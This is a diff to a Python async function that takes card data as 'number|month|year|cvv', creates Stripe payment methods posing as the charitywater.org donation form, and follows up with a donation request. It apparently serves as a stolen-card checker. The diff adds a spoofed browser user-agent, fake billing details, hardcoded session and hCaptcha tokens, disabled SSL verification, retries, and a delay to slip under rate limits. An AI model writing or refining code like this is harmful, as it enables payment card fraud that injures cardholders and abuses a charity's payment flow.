@@ -50,38 +50,58 @@ async def ppc(card):
         parts = card.split("|")
         if len(parts) != 4:
             return json.dumps({"error": "Invalid card format"})
+            
         cc, mon, year, cvv = parts
         year = year[-2:] if len(year) == 4 else year
 
-        connector = aiohttp.TCPConnector(limit=10, limit_per_host=5, ttl_dns_cache=300, use_dns_cache=True, ssl=False)
+        # Validate card number
+        if not re.match(r'^\d{16}$', cc):
+            return json.dumps({"error": "Invalid card number"})
+        
+        # Create session with better configuration
+        connector = aiohttp.TCPConnector(
+            limit=10,
+            limit_per_host=5,
+            ttl_dns_cache=300,
+            use_dns_cache=True,
+            ssl=False  # Disable SSL verification to avoid cert issues
+        )
+        
         async with aiohttp.ClientSession(connector=connector) as session:
+            # Step 1: Create payment method with Stripe (with retry logic)
             status1, resp1 = await make_request(
                 session,
                 url="https://api.stripe.com/v1/payment_methods",
                 method="POST",
                 headers={
                     'accept': 'application/json',
+                    'accept-language': 'en-US,en;q=0.9',
                     'content-type': 'application/x-www-form-urlencoded',
                     'origin': 'https://js.stripe.com',
                     'referer': 'https://js.stripe.com/',
-                    'user-agent': 'Mozilla/5.0',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                 },
-                data=f'type=card&billing_details[address][city]=New+york&billing_details[address][country]=IN&billing_details[address][line1]=A27+shsh&billing_details[email]=xavhsu27%40gmail.com&billing_details[name]=John+Smith&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&key={PK}',
+                data=f'type=card&billing_details[address][city]=New+york&billing_details[address][country]=IN&billing_details[address][line1]=A27+shsh&billing_details[email]=xavhsu27%40gmail.com&billing_details[name]=John+Smith&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&guid=090145d7-183a-44a1-9fac-2c2ee7762a395bb665&muid=3bd1f188-220f-4822-b7fa-2151afa3ab8a89f811&sid=e8a0a1fe-11fb-4bb6-aa5f-e5d954204cdf9621a5&payment_user_agent=stripe.js%2F7eb76afb12%3B+stripe-js-v3%2F7eb76afb12%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=48597&client_attribution_metadata[client_session_id]=669fb863-2872-423d-8cef-00cd7b74b142&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={PK}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzUyODQxNzY5LCJjZGF0YSI6IlZwbThJV2h6Z0o5RzVKN2w3OWQrWGtqRHJNelJabDByb29uTllxdWVKQXE2b01ZbW5MS0FGT2tSM0NFNFpmSU40UldUNEtjdVIvRVVMcGlKU3poeDBVUGlqcmh2Ums2VTQveTExMVZEMysxYVgzb2tZVTgwN2hYT0ljRVJRTWV6dC9BUXVsMFlVRmdIS2ZNdUlqMjQ4cUw4UC9ibDYxUThUUEEvc2sreHBPVmN2YjVlbkQrODBRVGdISVc3RHA4NHUyMklGN01DYlBPTWxkYngiLCJwYXNza2V5IjoiTGh3Y0dzbnB4V0JqNVkvaStTNGxBZTBrNTUwUHpvaE16Q3h4enNhT25jMHMxOTM5c2Y2cWp1R09XclVUTEhaSktnVVpZRnFvU0dEM1I0dW4zcTNxTHJpMGNDTFZPQ043S0luYm4xWFhRVFBDZGozeGJXU09GRFI0ODA4TnhLbjZpb0V2RWhoZmZNQUw2eGgwcWdmOHlGMFA1NnlNbXZmWlEweHg2aGlCVG5rZmEwR2Y4QVBuN1hxU1A5WDF1UDFEdERHVmhlRkt1ZXBhYzlCVFB1VzR1OXVLNW9ZbEdHYkk4OG8wbldYc1JPOFJwNUtEMzFPdVcxL25vRExQNUNwN3EwUmpHYlV4b1hCQmkzLzFZUHF3cFEwZXB3QjBMM2xpYjdFTUYvSmtrbEVwaGFwbGdUUTVBbkJNenRYYzM1T09lYndmZmtJSUd1RzlJMllIRGhqTi95Qm4yOVZFNlhudERiTlFFN2xJanpjYTlsd285Zkg1U1ExT0t1ekRkU3JVbFdsN2tjR2piYXpZbEEzTi8rdVp0a3FSL2hjWHE1SXdsSG5wRmZxZVMvQ21oamlGWExwQ1preUpuUDlEcXkrNnBYelZCRFJ2eVdVQjQ4V1J5dnlqWnZEQjV5MVhRTExwdS9nN1c4UG1Cekw1dnpsWTk5bEtQRWhESnVhNXZGdi9rN0szTGNrOWg2MU9pd29rY0lCdHY1eTBQZXlubU1WWVRHeVJTeCsvR0ZqME5jSlA2SEpCRXRsSnZDb3J4SHd6TUhPRlIzaUlvYk93d2lXUVY3dDI1RThieDJuYm1WWTdEUDJzZDE1TVViMzdCakozbDgrdmdrZER5azBJOUhMTDRVN0I3dkt3Mk9OTlhJdFlCdm5VUTVyc3NmNUo1M2ROZTJIcjYxNDhNaEpxbmlRcVpnaWFxRGVhYUlkZ2ZmdHc2TzZmUkN0elJyNkZ2TkYxQ2ZIcC80NmhDZXNIU3B3Z0tkRmdHTGZCMXlmaEgzZHV3ZEZXUzRCT05FZTNpS3VyOHd4QXlCQURIa29LTkNrS3NiMldiNWRvbThybEJoZXViQThJTG9WeWpQd2ErV1ViUVZ0aGdsZGN6Q0Y3UGhicGI4TDBaRnlJc1hEanJ3VVV4cDhJY2h2RTVaS2lpeEtsNDlhMHp5QlpoemUwa2dPWGg4a2M3eUdhT1NDbFptOUc5aWJPdXJoUHJ6RmVObjZoSkxPL1NubmZwbS9EYkdxMGZMdXdvL1RPcHRON3ZyZ1BBTU5mQlRoN1FWOEcrT3dSaFNZVXVBMFZZaWxMb2NSeVN0dFpucWFXTFJXbHBnaEhNVmNOcXZzSnhCR2V5K1VKbkZIZVpsZkNyUUZYN3VhK1FiNjVMc0hNenk5Nk5qRzZ4dUhVMnAySXRGeVBQUzFFMCtjSjFLbHducW00bXN2SURnb1YvWU9MY3Y4TlpJcTNiR3ZmQ0k3bCtuaXNyb2dJSHI5VjRodnhPRTlhVTFLenZxcGtOd051OVVOcXlaSkRoUVQ4cDJJRlhEaXFmVUk3ODg5ZU1xV1VIV3UxaUdUYk9ET1ExM0JjWUt6Z0grSjNuM1NJOGNleGI1bUx1bGk2dWNObmZPbEhVQXVXbDZVb0htRXNieExkWHRmQUFBcC9vZ3BWdVVHeGtVL3NpeFFJQjBGejYzeWJQN0ZkdmlXZGc4a3h6akx4ZnhXcEQ5RUk3TnJ5OWVFNXdaVW1UdFZWVFBQTDBsdzlnU2VaclVqS0E4ZXRRdXpJeURyM3IzTHl2b1I3ak5XYU9NVmhkdW15S0I1T1hqbVZCUnljVzNubFA2UVVhb2FDL1F2Rm9IVFoyV2pCbmZvODhmWHQreSsvYUNxRjdhNVY2MExlV3JUWXlzdVBZMmNmSjhmOTRtVlhxLzFMM1N0V0xlRzlTOUhEVURlWldYdzRmVjFYeTRUanBYa0pMUGpLdEE2aFJDOUk2RTJRcHM0bmNiKzcrT0gxVGM1b1JLaXVWYytKaVorYWxNQy8yaVl4K094L2VyeXlPTHpHYzByTzkvYVV4bkRrMWpyU2tyOXBSZVczaWx6YlNEd0dIMHo3WEFQL2lvS3B6MCt1eHZQZ3BHVGFKMm9pTUo4RGhOODhIMWJFUlE1Y25JRnViTWpFaFNhcnZQMjRPbFB6T3BYaFVQeXJqeGNEUnhHZzk4YUhGT0JvTnV4SGU2RUJlVHRTa045Q0syZkUzVzBMSFRVbE0rS0tiZlZsN0g0dCtvdzdmdW0rclE9PSIsImtyIjoiNGE1NjMxNDAiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.nNB7eRxG2k-bemnjEITxt66cXmBbS7wcqCaAjxZbHsk',
                 timeout=30,
                 retries=3
             )
+            
             if status1 not in [200, 201]:
+                # Return exact Stripe error response
                 return resp1
+                
             try:
                 payment_data = json.loads(resp1)
                 pmid = payment_data.get("id")
             except:
                 pmid = parseX(resp1, '"id": "', '"')
+                
             if not pmid:
-                return json.dumps({"error": "Payment method creation failed"})
-
+                return json.dumps({"error": {"message": "Payment method creation failed", "code": "pm_creation_failed"}})
+            
+            # Add delay to prevent rate limiting
             await asyncio.sleep(1)
-
+            
             status2, resp2 = await make_request(
                 session,
                 url=f"{DOMAIN}/donate/stripe",
